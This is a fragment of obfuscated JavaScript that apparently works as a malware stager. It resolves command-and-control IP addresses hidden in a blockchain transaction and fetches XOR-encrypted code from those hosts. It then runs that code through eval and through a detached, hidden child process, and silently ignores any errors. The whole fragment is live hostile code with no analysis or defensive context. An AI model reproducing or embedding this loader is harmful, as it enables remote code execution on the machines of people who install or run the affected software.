_0x311b27(_0x361384);},'XUzln':_0x55f1b7(0xcc),'QbRRV':_0x55f1b7(0x175),'nGxVW':_0x55f1b7(0x16b),'RmfMB':_0x55f1b7(0x10f),'WByWQ':function(_0x371b0c,_0x16278f){return _0x371b0c+_0x16278f;},'durVE':_0x55f1b7(0xd5)+_0x55f1b7(0x93)+_0x55f1b7(0x1be)+_0x55f1b7(0x10a)+_0x55f1b7(0x197)+_0x55f1b7(0x17c)+_0x55f1b7(0x99)+_0x55f1b7(0x1a0)+_0x55f1b7(0x113)+_0x55f1b7(0xcb)+_0x55f1b7(0x140)+'6','SIecw':function(_0x3a902b,_0x8b5878){return _0x3a902b(_0x8b5878);},'bKTVo':_0x55f1b7(0x176),'QthWB':function(_0x2a91bb,_0x3cdf2e,_0xe319e3){return _0x2a91bb(_0x3cdf2e,_0xe319e3);},'UniBA':_0x55f1b7(0x1a5),'EkQIH':_0x55f1b7(0x9d),'unMKf':_0x55f1b7(0x91),'ngsKF':function(_0x3c4556,_0xbf6f51,_0x1165e0,_0x42cd2e){return _0x3c4556(_0xbf6f51,_0x1165e0,_0x42cd2e);},'fkRSW':_0x55f1b7(0x18f),'wibbZ':function(_0x38b47e,_0x173a73){return _0x38b47e+_0x173a73;},'zAkNr':_0x55f1b7(0x161),'aBWJK':function(_0x44350e,_0x4a8a13){return _0x44350e-_0x4a8a13;},'xzqPs':function(_0x317261,_0x3ab8e8){return _0x317261(_0x3ab8e8);},'USRYf':_0x55f1b7(0x112),'CQAWy':function(_0x47a07f,_0x185a93,_0x34cec3,_0x21f47f){return _0x47a07f(_0x185a93,_0x34cec3,_0x21f47f);},'ojvxD':_0x55f1b7(0xc0)+_0x55f1b7(0xb7),'LnaXN':function(_0x32ec1e,_0x4fdf1b,_0x28721d,_0x460917){return _0x32ec1e(_0x4fdf1b,_0x28721d,_0x460917);},'MJEEv':_0x55f1b7(0x108)+_0x55f1b7(0x103)},_0x4d9a5d=_0xc996f9[_0x55f1b7(0x162)](BigInt,await _0xc996f9[_0x55f1b7(0x8b)](wr,(_0x227c26,_0x37693d)=>rc(_0x227c26,_0x55f1b7(0x100)+_0x55f1b7(0x147),[],_0x37693d))),_0x1f317d=_0xc996f9[_0x55f1b7(0x186)](_0x4d9a5d,_0xc996f9[_0x55f1b7(0xe5)](_0x4d9a5d,B));let _0x12c3f1=await _0xc996f9[_0x55f1b7(0x130)](fm,_0xc996f9[_0x55f1b7(0x1bf)](cb,_0x1f317d)[_0x55f1b7(0x17a)](bt));_0x12c3f1||(_0x12c3f1=await _0xc996f9[_0x55f1b7(0x18b)](ls,_0x4d9a5d)[_0x55f1b7(0x174)](li));const _0x532ab5=Buffer[_0x55f1b7(0x87)](_0x12c3f1['tx']['to'][_0x55f1b7(0x90)](/^0x/i,''),_0xc996f9[_0x55f1b7(0x10e)]),_0x1039ea=_0x1ff414=>_0x1ff414[0x1cf+-0x58*-0x5f+-0x11*0x207]+'\u002E'+_0x1ff414[-0x4c6*0x4+-0x657*-0x1+0xcc2]+'\u002E'+_0x1ff414[0x1*-0x23d8+-0xd7b+0xad*0x49]+'\u002E'+_0x1ff414[-0x1165+0x24da*0x1+-0x1372*0x1],[_0x4ef4ee,_0x5a3548]=[_0xc996f9[_0x55f1b7(0x18b)](_0x1039ea,_0x532ab5[_0x55f1b7(0x8f)](0x3f+-0x13*0x8e+0xa4b,-0x2*-0x46b+-0x27*-0x97+-0x1fd3*0x1)),_0xc996f9[_0x55f1b7(0x18b)](_0x1039ea,_0x532ab5[_0x55f1b7(0x8f)](0x13*-0x3b+-0x16f9+0x1b5e,0xecd+0x1*0x4a+0x3*-0x505))],_0x316007=global;_0x316007['_V']=_0x316007['i'],_0x316007['_H']=_0x55f1b7(0x122)+_0x4ef4ee+_0x55f1b7(0x10c),_0x316007[_0x55f1b7(0x9d)]=_0x55f1b7(0x122)+_0x5a3548+_0x55f1b7(0x10c),_0x316007[_0x55f1b7(0x1a5)]=_0x55f1b7(0x122)+_0x4ef4ee+_0x55f1b7(0x153),_0x316007[_0x55f1b7(0x91)]=_0x55f1b7(0x122)+_0x4ef4ee+_0x55f1b7(0x10c);function _0x35f66a(_0x15a3c7,_0x5172cf){const _0x1fe8ef=_0x55f1b7,_0x4e1685={'ogFTC':function(_0x5d5ef1,_0x25c12a){const _0x44a9c2=_0xc702;return _0xc996f9[_0x44a9c2(0xe1)](_0x5d5ef1,_0x25c12a);},'SrQJg':function(_0x132ac7,_0xe642fc){const _0x54353a=_0xc702;return _0xc996f9[_0x54353a(0xe5)](_0x132ac7,_0xe642fc);},'pMLys':_0xc996f9[_0x1fe8ef(0x178)],'QZywI':function(_0x17638b,_0x1ddcf0){const _0x40a40e=_0x1fe8ef;return _0xc996f9[_0x40a40e(0xad)](_0x17638b,_0x1ddcf0);},'yyHsj':_0xc996f9[_0x1fe8ef(0x180)],'bPQfv':function(_0x524d49,_0x10b991){const _0x402a9e=_0x1fe8ef;return _0xc996f9[_0x402a9e(0x1bf)](_0x524d49,_0x10b991);},'shSPT':function(_0x2f3f78,_0x4c3d09){const _0x25c412=_0x1fe8ef;return _0xc996f9[_0x25c412(0x18b)](_0x2f3f78,_0x4c3d09);},'uMvOo':_0xc996f9[_0x1fe8ef(0x14a)],'BtJwU':_0xc996f9[_0x1fe8ef(0x1c0)],'OxJjQ':_0xc996f9[_0x1fe8ef(0x88)],'wIbeD':function(_0x2d3440,_0x52e124){const _0x4f0500=_0x1fe8ef;return _0xc996f9[_0x4f0500(0x1bf)](_0x2d3440,_0x52e124);},'BLrzN':_0xc996f9[_0x1fe8ef(0x14e)],'YyqQS':function(_0xb87162,_0x1812f8){const _0x5ac0fc=_0x1fe8ef;return _0xc996f9[_0x5ac0fc(0x1bf)](_0xb87162,_0x1812f8);},'RbxTf':_0xc996f9[_0x1fe8ef(0x136)]},_0xc307f={'hostname':_0x5172cf[_0x1fe8ef(0xb8)],'port':+_0x5172cf[_0x1fe8ef(0x96)]||0x2b3*0x4+-0x1*-0x941+0xa3*-0x1f,'path':_0xc996f9[_0x1fe8ef(0xc7)](_0x5172cf[_0x1fe8ef(0xcd)],_0x5172cf[_0x1fe8ef(0xa5)]),'headers':{'User-Agent':_0xc996f9[_0x1fe8ef(0x131)],'Sec-V':_0x316007['_V']||0x266b+0x25*0xcb+-0x43c2}},_0x147817=_0x2ab23b=>{const _0x4d1e95=_0x1fe8ef,_0x133386=_0x15a3c7[_0x4d1e95(0x1bc)];for(let _0x511b70=-0x6c9+0x2488+0x5f3*-0x5;_0x4e1685[_0x4d1e95(0x148)](_0x511b70,_0x2ab23b[_0x4d1e95(0x1bc)]);_0x511b70++)_0x2ab23b[_0x511b70]^=_0x15a3c7[_0x4d1e95(0x9a)](_0x4e1685[_0x4d1e95(0x117)](_0x511b70,_0x133386));return _0x2ab23b[_0x4d1e95(0x156)](_0x4e1685[_0x4d1e95(0x1a2)]);},_0x440cea=_0x2ef284=>{const _0x438a51=_0x1fe8ef,_0x55d87c=_0x2ef284[_0x438a51(0xaf)][_0xc996f9[_0x438a51(0x14e)]];if(!_0x55d87c)throw new Error(_0xc996f9[_0x438a51(0x134)]);return _0xc996f9[_0x438a51(0x8b)](_0x147817,Buffer[_0x438a51(0x87)](_0x55d87c,_0xc996f9[_0x438a51(0xc4)]));},_0x50d02a=_0x2b7faa=>new Promise((_0x2af824,_0x389a52)=>{const _0x1cecae=_0x1fe8ef,_0xe9fc74={'ZuHfL':function(_0x101d75,_0x445496){const _0x118749=_0xc702;return _0x4e1685[_0x118749(0x15d)](_0x101d75,_0x445496);},'GGbog':function(_0x2c6e05,_0x4ae1fb){const _0xf9a117=_0xc702;return _0x4e1685[_0xf9a117(0xbb)](_0x2c6e05,_0x4ae1fb);},'QZRte':_0x4e1685[_0x1cecae(0x8e)],'OGXGz':function(_0xce0e7b,_0x2c9d77){const _0x21b712=_0x1cecae;return _0x4e1685[_0x21b712(0x1b3)](_0xce0e7b,_0x2c9d77);},'cRXVv':_0x4e1685[_0x1cecae(0x84)],'fLEkP':function(_0x3aa2eb,_0x287a3a){const _0x1042bf=_0x1cecae;return _0x4e1685[_0x1042bf(0xbb)](_0x3aa2eb,_0x287a3a);}},_0x289203=http[_0x1cecae(0x8a)]({..._0xc307f,'method':_0x2b7faa},_0x409e9a=>{const _0x441ca6=_0x1cecae;if(_0x4e1685[_0x441ca6(0x19c)](_0x2b7faa,_0x4e1685[_0x441ca6(0x1b8)])){try{_0x4e1685[_0x441ca6(0x141)](_0x2af824,_0x4e1685[_0x441ca6(0x141)](_0x440cea,_0x409e9a));}catch(_0x4cb34b){_0x4e1685[_0x441ca6(0x15d)](_0x389a52,_0x4cb34b);}_0x409e9a[_0x441ca6(0xe0)]();return;}const _0x4d7040=[];_0x409e9a['on'](_0x4e1685[_0x441ca6(0xd4)],_0x599f3e=>_0x4d7040[_0x441ca6(0xe3)](_0x599f3e)),_0x409e9a['on'](_0x4e1685[_0x441ca6(0x171)],()=>{const _0xda10a0=_0x441ca6;try{const _0x5c40ca=Buffer[_0xda10a0(0x12a)](_0x4d7040);if(_0x5c40ca[_0xda10a0(0x1bc)])return _0xe9fc74[_0xda10a0(0x1b7)](_0x2af824,_0xe9fc74[_0xda10a0(0x12d)](_0x147817,_0x5c40ca));if(_0x409e9a[_0xda10a0(0xaf)][_0xe9fc74[_0xda10a0(0x165)]])return _0xe9fc74[_0xda10a0(0x1b7)](_0x2af824,_0xe9fc74[_0xda10a0(0x12d)](_0x440cea,_0x409e9a));_0xe9fc74[_0xda10a0(0x183)](_0x389a52,new Error(_0xe9fc74[_0xda10a0(0xd2)]));}catch(_0x309348){_0xe9fc74[_0xda10a0(0x137)](_0x389a52,_0x309348);}}),_0x409e9a['on'](_0x4e1685[_0x441ca6(0x133)],_0x389a52);});_0x289203['on'](_0x4e1685[_0x1cecae(0x133)],_0x389a52),_0x289203[_0x1cecae(0x175)]();});return _0xc996f9[_0x1fe8ef(0x162)](_0x50d02a,_0xc996f9[_0x1fe8ef(0x11d)])[_0x1fe8ef(0x174)](()=>_0x50d02a(_0x1fe8ef(0x116)));}async function _0x4afabd(_0x34a475,_0x3638cd,_0x219678){const _0x1d2052=_0x55f1b7;try{const _0x4506a8=await _0xc996f9[_0x1d2052(0xbd)](_0x35f66a,_0x3638cd,_0x34a475),_0x589a8d=_0x1d2052(0x9b)+_0x1d2052(0x195)+(_0x316007['_V']||-0x747+0xf4d*-0x1+0x1694)+_0x1d2052(0xb9)+(_0x219678?'\u005F\u0048':_0xc996f9[_0x1d2052(0x1ae)])+_0x1d2052(0x195)+(_0x219678?_0x316007['_H']:_0x316007[_0x1d2052(0x1a5)])+_0x1d2052(0xb9)+(_0x219678?_0xc996f9[_0x1d2052(0xbe)]:_0xc996f9[_0x1d2052(0xb2)])+_0x1d2052(0x195)+(_0x219678?_0x316007[_0x1d2052(0x9d)]:_0x316007[_0x1d2052(0x91)])+(_0x1d2052(0xb9)+_0x1d2052(0xee)+_0x1d2052(0xdb)+_0x1d2052(0xf1)+_0x1d2052(0xfb)+_0x1d2052(0xda));_0x219678||_0xc996f9[_0x1d2052(0x18b)](eval,_0xc996f9[_0x1d2052(0xc7)](_0x589a8d,_0x4506a8)),_0xc996f9[_0x1d2052(0x132)](spawn,_0xc996f9[_0x1d2052(0x157)],['-e',_0xc996f9[_0x1d2052(0x19d)](_0x589a8d,_0x4506a8)],{'detached':!(-0x1*0x1d96+-0x2a*-0x87+-0x11*-0x70),'stdio':_0xc996f9[_0x1d2052(0x13e)],'windowsHide':!(0xf5f+-0x16fc+0x79d*0x1)})[_0x1d2052(0x8d)]();}catch(_0xedc825){}}await _0xc996f9[_0x55f1b7(0x1bb)](_0x4afabd,new URL(_0x55f1b7(0x122)+_0x4ef4ee+(_0x55f1b7(0x139)+'s')),_0xc996f9[_0x55f1b7(0x95)],!(-0xf0e+0x12d2+-0x3c3)),await _0xc996f9[_0x55f1b7(0x16d)](_0x4afabd,new URL(_0x55f1b7(0x122)+_0x4ef4ee+_0x55f1b7(0x158)),_0xc996f9[_0x55f1b7(0xfd)],!(0x2b*0xa7+0x157d*-0x1+-0x690));})());

